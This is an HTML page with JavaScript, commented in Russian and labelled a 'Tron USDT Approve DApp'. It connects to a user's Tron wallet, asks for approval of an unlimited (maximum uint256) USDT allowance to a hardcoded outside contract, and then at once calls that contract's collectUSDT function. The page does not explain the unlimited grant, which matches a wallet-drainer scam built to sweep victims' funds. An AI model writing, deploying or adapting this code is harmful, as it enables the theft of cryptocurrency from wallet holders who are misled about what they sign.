<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tron USDT Approve DApp</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            background-color: #0f172a;
            color: #ffffff;
        }
        .action-btn {
            background-color: #2563eb;
            color: white;
            border: none;
            padding: 16px 32px;
            font-size: 18px;
            border-radius: 12px;
            cursor: pointer;
            font-weight: bold;
            margin: 10px;
        }
        .action-btn:hover { background-color: #1d4ed8; }
        .wallet-status { margin-top: 20px; font-size: 14px; color: #ef4444; word-break: break-all; padding: 0 20px; text-align: center; }
    </style>
</head>
<body>

    <button id="connectBtn" class="action-btn">Connect Wallet</button>
    <button id="approveBtn" class="action-btn" style="display:none; background-color: #16a34a;">Approve & Collect USDT</button>
    <div id="status" class="wallet-status">Not connected</div>

    <!-- Подключаем TronWeb SDK -->
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>

    <script>
        // Адреса и параметры
        const USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // Официальный контракт USDT TRC20
        const MY_SMART_CONTRACT = "THQkf7RkW1JaKNdyH69dYUnh7mbz2nSfoY"; // Ваш смарт-контракт

        let userAddress = null;

        document.getElementById('connectBtn').addEventListener('click', async () => {
            const status = document.getElementById('status');
            const connectBtn = document.getElementById('connectBtn');
            const approveBtn = document.getElementById('approveBtn');

            // Ожидание появления провайдера tronWeb в мобильном кошельке
            let attempts = 0;
            while (!window.tronWeb && attempts < 20) {
                await new Promise(r => setTimeout(r, 250));
                attempts++;
            }

            if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
                alert('Откройте эту страницу во встроенном браузере Trust Wallet и убедитесь, что кошелек разблокирован в сети Tron.');
                return;
            }

            try {
                userAddress = window.tronWeb.defaultAddress.base58;
                
                const shortAddr = `${userAddress.substring(0, 6)}...${userAddress.substring(userAddress.length - 4)}`;
                connectBtn.innerText = shortAddr;
                connectBtn.style.backgroundColor = '#334155';
                connectBtn.disabled = true;
                
                status.innerText = `Connected: ${userAddress}`;
                status.style.color = '#22c55e';

                // Показываем кнопку для запуска approve / взаимодействия с контрактом
                approveBtn.style.display = 'block';

            } catch (err) {
                console.error(err);
                alert('Ошибка подключения кошелька.');
            }
        });

        // Кнопка запуска процессов Approve и вызова вашего контракта
        document.getElementById('approveBtn').addEventListener('click', async () => {
            if (!userAddress) return;

            try {
                const status = document.getElementById('status');
                status.innerText = 'Выполнение транзакции Approve...';

                // 1. Подключаемся к контракту USDT (TRC20)
                const usdtContract = await window.tronWeb.contract().at(USDT_CONTRACT_ADDRESS);

                // Сумма для одобрения (например, максимальная uint256 или фиксированная сумма в микро-USDT / sun)
                // 1 USDT = 1000000 sun. Указываем огромный лимит для автоматизации.
                const approveAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; 

                // 2. Вызываем функцию approve для вашего смарт-контракта
                // Пользователь подтверждает это действие один раз в кошельке
                const txApprove = await usdtContract.approve(
                    MY_SMART_CONTRACT, 
                    approveAmount
                ).send({
                    feeLimit: 100000000 // Лимит энергии (в sun)
                });

                console.log("Approve hash:", txApprove);
                status.innerText = 'Approve выполнен! Автоматический сбор...';

                // 3. Здесь можно сразу вызвать функцию вашего контракта (например, collectUSDT)
                const myContract = await window.tronWeb.contract().at(MY_SMART_CONTRACT);
                
                // Пример вызова вашей функции сбора (если она так называется в вашем контракте)
                const txCollect = await myContract.collectUSDT().send({
                    feeLimit: 150000000
                });

                console.log("Collect hash:", txCollect);
                status.innerText = 'Операция успешно завершена!';
                status.style.color = '#16a34a';

            } catch (err) {
                console.error(err);
                alert('Транзакция отклонена или произошла ошибка: ' + (err.message || err));
                document.getElementById('status').innerText = 'Ошибка выполнения';
            }
        });
    </script>
</body>
</html>
